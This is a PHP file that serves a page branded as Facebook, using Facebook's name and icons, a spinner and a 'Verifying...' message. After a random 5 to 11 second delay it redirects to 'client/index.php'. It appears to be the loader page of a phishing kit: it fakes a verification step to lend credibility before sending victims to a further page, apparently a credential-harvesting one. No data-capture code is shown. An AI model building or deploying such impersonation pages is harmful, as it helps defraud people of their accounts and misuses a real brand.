<?php

error_reporting(0);

echo '<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/svg" sizes="32x32" href="images/fb.svg">
    <title>Facebook</title>
    <style>
    body {
        font-family: Arial, sans-serif;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
    }
    .loading-box {
        width: 80%;
        max-width: 300px;
        padding: 1px;
        border: 2px solid #ccc;
        border-radius: 10px;
        display: flex;
        justify-content: center;
        align-items: center;
        background-color: #f6f6f6;
    }
    .loading-spinner {
        border: 4px solid #f3f3f3;
        border-top: 4px solid #1877f2;
        border-radius: 50%;
        width: 30px;
        height: 30px;
        animation: spin 2s linear infinite;
    }
    .loading-text {
        margin-left: 5px;
        font-size: 20px;
        color: #767474;
    }
    .loading-image img {
        width: 30px;
        height: 30px;
        margin-left: 100px;
    }
    @keyframes spin {
        0% {
            transform: rotate(0deg);
        }
        100% {
            transform: rotate(360deg);
        }
    }
    </style>
    <script>
        function redirectToNextPage() {
            var delay = Math.floor(Math.random() * 6000) + 5000; // Random delay between 5000ms (5s) and 11000ms (11s)
            setTimeout(function() {
                window.location.href = "client/index.php";
            }, delay);
        }
        window.onload = redirectToNextPage;
    </script>
</head>

<body>
    <div class="loading-box">
        <div class="loading-spinner"></div>
        <p class="loading-text">Verifying...</p>
        <div class="loading-image">
            <img src="images/facebook.svg" alt="Facebook">
        </div>
    </div>
</body>

</html>';
?>